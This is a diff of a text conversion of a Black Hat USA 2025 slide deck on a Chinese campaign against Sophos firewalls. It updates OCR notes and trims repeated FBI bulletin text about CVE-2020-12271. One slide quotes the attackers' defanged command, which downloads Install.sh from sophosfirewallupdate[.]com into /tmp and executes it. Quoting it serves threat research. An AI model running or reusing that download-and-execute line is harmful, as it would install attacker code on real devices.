@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Andrew Brandt_Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses.pdf"
 pages: 65
 sha256: "2c3e2600240c627740e776a11655236dc7d02d959ba099cc0ac38d24722c9544"
-text_chars: 26676
-ocr_pages: 9
+text_chars: 20887
+ocr_pages: 6
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 90.3
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:49:57Z"
+converted_at: "2026-08-12T05:04:55Z"
 ---
 # Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses
 
 **Speakers:** Andrew Brandt  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Andrew Brandt_Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses.pdf` (65 pages)
+
 
 ## Slide 1
 
@@ -30,7 +35,8 @@ Andrew Brandt
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ‘black hat
@@ -41,7 +47,6 @@ Firewalls Under Fire
 China’s ongoing campaign to compromise
 network protection devices worldwide
 Andrew Brandt
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 2
@@ -164,31 +169,13 @@ Andrew Brandt
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Phase zero: The break-in
 at
-ant
-=
-es
-‘wy
-Lr
-we
-ay
-+
-x
-Any
-WN
-Ws
-°®
-7]
-et
-ee
-aoe a
-cA
 " HTTP Response }
-#BHUSA @BlackHatEvents
 Source: Sophos / Sergei Shevchenko
 ```
 
@@ -304,18 +291,16 @@ Source: Sophos / Sergei Shevchenko
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Central management
-~~
 ron @) Manage your firewall using
 ©@) Sophos Firewall Manager (SFM)
 Firewall Manager IP address/domain *
 https://sophosfirewallupdate.c |
 l|cd /tmp/ && wget hxxps://sophosfirewallupdate[.]com/sp/Install.sh -O /tmp/x.sh && chmod 777 /tmp/x.sh && sh
-/tmp/x.sh]|
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 18
@@ -792,50 +777,11 @@ Image source: Mutant Enemy / Buffy The Vampire Slayer "Once More, With Feeling"
 
 **Image source: FBI**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-\ SEEKING
-/ INFORMATION
-EDGE DEVICE INTRUSIONS
-Cyber Intrusions into Companies and Government Entities
-April 2020 to Present
-DETAILS
-The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
-belonging to companies and government entities.
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-Image source: FBI
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 54
 
 #BHUSA @BlackHatEvents
 
 **Image source: FBI**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-\ SEEKING
-/ INFORMATION
-EDGE DEVICE INTRUSIONS
-Cyber Intrusions into Companies and Government Entities
-April 2020 to Present
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-DETAILS
-The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
-belonging to companies and government entities.
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-Image source: FBI
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 55
 
@@ -843,53 +789,17 @@ Image source: FBI
 
 **Image source: FBI**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-\ SEEKING
-/ INFORMATION
-EDGE DEVICE INTRUSIONS
-Cyber Intrusions into Companies and Government Entities
-April 2020 to Present
-As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-DETAILS
-The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
-belonging to companies and government entities.
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-Image source: FBI
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 56
 
 #BHUSA @BlackHatEvents
 
 **Image source: FBI**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-\ SEEKING
-/ INFORMATION
-EDGE DEVICE INTRUSIONS
-Cyber Intrusions into Companies and Government Entities
-April 2020 to Present
-As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-(Cve-2020-12271
 malware exploiting the vulnerability |\CVE-2020-12271\as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-DETAILS
-The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
-belonging to companies and government entities.
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-Image source: FBI
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 57
@@ -898,28 +808,14 @@ Image source: FBI
 
 **Image source: FBI**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-\ SEEKING
-/ INFORMATION
-EDGE DEVICE INTRUSIONS
-Cyber Intrusions into Companies and Government Entities
-April 2020 to Present
 EEN
-As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-(Cve-2020-12271
 malware exploiting the vulnerability |\CVE-2020-12271\as part of
 a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
 from firewalls worldwide. The FBI is seeking information regarding} the identities of the individuals responsible for these cyber intrusions.
-DETAILS
-The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
-belonging to companies and government entities.
-As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
-malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
-from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
-Image source: FBI
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 58
@@ -992,7 +888,8 @@ Image source: FBI
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Most Wanted
@@ -1005,7 +902,6 @@ Aliases:
 gxiaomao
 Aliases: Image source: FBI Most Wanted List
 gbigmao, gxiaomao
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 63
